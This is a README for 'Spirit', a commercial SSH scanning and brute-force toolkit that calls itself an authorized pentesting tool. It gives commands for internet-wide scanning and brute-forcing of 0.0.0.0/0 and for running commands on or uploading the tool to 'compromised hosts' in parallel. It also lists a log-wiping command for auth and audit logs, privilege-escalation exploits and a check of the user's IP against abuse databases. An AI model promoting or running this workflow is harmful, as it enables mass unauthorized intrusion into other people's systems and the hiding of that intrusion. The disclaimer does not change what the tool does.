# Spirit

**High-performance tools for authorized network pentesting and SSH security auditing.**

Spirit is a specialized CLI toolkit for experienced security professionals. It excels at large-scale SSH discovery, banner grabbing, and intelligent credential testing with minimal network noise.

<p align="left">
  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a>
</p>

## Installation

The fastest way to get started:

```bash
curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
./spirit --help
```

This installs `./spirit` into your current directory with checksum verification.

**Alternative:** Pre-built binaries are available in the [bin/](bin/) directory for air-gapped environments.

## Recommended: Targeted Zone Scans

For most assessments, use the official `go.sh` wrapper. It orchestrates the full high-performance pipeline with automatic backups and dependency handling.

```bash
# Get the wrapper
curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh -o go.sh
chmod +x go.sh

# Define your targets
cat > zone.lst << 'EOF'
192.168.0.0/16
10.1.1.0/24
203.0.113.0/24
EOF

# Run the full pipeline (masscan → parse → banner → brute)
sudo ./go.sh --zone zone.lst --ports 22,2222 --rate 30000
```

**Requirements:** `sudo` (masscan needs raw sockets). The script auto-installs `spirit` and `masscan` if missing.

### What the pipeline produces

| File            | Contents                              |
|-----------------|---------------------------------------|
| `open.lst`      | Raw masscan results                   |
| `h.lst`         | Hosts in `IP:PORT` format             |
| `b.lst`         | Hosts with SSH banners                |
| `found.ssh`     | Successful logins (full details)      |
| `found.login`   | Just `user:pass` pairs                |
| `found.lst`     | `user:pass:host:port` (for autossh)   |
| `found.errors`  | Connection failure statistics         |
| `found.nologin` | Hosts that accepted creds but blocked shells |

## The Spirit Pipeline

```
zone.lst ──▶ masscan ──▶ parse ──▶ banner ──▶ brute ──▶ autossh
                │            │          │         │
           open.lst      h.lst      b.lst   found.*
```

After a successful brute run, use `autossh` to execute commands or upload tools across all compromised hosts in parallel:

```bash
./spirit autossh --command 'uname -a && id'
./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
```

## Command Reference

| Command      | Aliases     | Description |
|--------------|-------------|-------------|
| `brute`      | `B`         | SSH password brute-forcer with smart blocking, honeypot detection, and key auth support |
| `brutekey`   | `K`         | Brute-force using private keys against users in your passfile |
| `banner`     | `b`         | Fast, stealthy SSH version grabber (no login attempt) |
| `autossh`    | `o`, `as`   | Concurrent SSH access to all hosts in `found.lst` — run commands or upload files |
| `scan`       | `s`         | Fast LAN/open-port scanner (no root required) |
| `masscan`    | `ms`        | Convenient wrapper around masscan using `zone.lst` |
| `parse`      | `p`         | Convert masscan/nmap `-oG` output into clean `h.lst` |
| `autobrute`  | `ab`        | Continuous random scanning + banner + brute loop (internet-wide) |
| `ports`      | `P`         | Generate random port lists |
| `zap`        | `z`         | Clean your tracks from wtmp/utmp/lastlog/auth.log/audit.log |
| `exploit`    | `e`         | Run local privilege escalation exploits (CVEs) |
| `abuse`      | —           | Check your egress IP against abuse databases |
| `encrypt`    | `E`         | AES-256-GCM encrypt your `p.lst` passfile |
| `upgrade`    | `u`         | Self-update to the latest version |

Run `./spirit <command> --help` for detailed flags on any command.

## What Makes Spirit Different

- **Stealthy banner grabbing** — Retrieves SSH versions with the absolute minimum packets, then immediately drops the connection.
- **Intelligent brute-forcing** — One password per host, automatic removal of unreachable hosts, honeypot detection, and randomized ordering.
- **Broad SSH compatibility** — Supports legacy ciphers and algorithms (cast128-cbc, idea-cbc, arcfour, 3des-cbc, hmac-md5, etc.) to reach old/IoT/embedded devices.
- **Key-based auth support** — Will try provided private keys before falling back to passwords.
- **Parallel post-exploitation** — `autossh` lets you run commands or stage tools across hundreds of hosts simultaneously.
- **Stable output** — All `found.*` files are always written relative to where you launched the command.
- **Context-aware cancellation** — Ctrl-C cleanly stops in-flight connections instead of waiting for timeouts.

## Continuous / Internet-Wide Scanning

For the classic "point it at the internet and walk away" workflow:

```bash
cat > zone.lst << 'EOF'
0.0.0.0/0
EOF

./spirit autobrute
```

This loops forever: masscan on random ports → banner → brute → repeat.

> **Note:** Most users doing targeted assessments should prefer `./go.sh` instead.

## Licensing (Freemium)

- **Port 22** is fully functional with a 1-hour trial window per run.
- All other ports require a paid license.
- Pricing: **$1 per server per day** (XMR only).

```bash
./spirit buy
```

After purchase, activate with:

```bash
./spirit register
```

Support is available on [Telegram](https://t.me/spiritNPT).

## Support the Project

**Monero (XMR) — preferred**

```
895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s
```

![Monero QR](asset/xmrqr.png)

**Bitcoin (BTC)**

```
bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5
```

## Legal & Disclaimer

> [!IMPORTANT]
> This software is provided **only for authorized penetration testing and educational purposes**.
>
> You must have explicit written permission from the owner of any systems you scan or attack. Unauthorized access is illegal in most jurisdictions. The authors are not responsible for any misuse or damage caused by this tool.

## Community

- **Telegram**: [t.me/spiritNPT](https://t.me/spiritNPT)
- **Issues**: [GitHub Issues](https://github.com/theaog/spirit/issues)

Don't forget to ⭐ the repo if you find Spirit useful.

---

<p align="center">
  <sub>(c) The Armor of God — Clean software. Only license verification data is ever sent home.</sub>
</p>
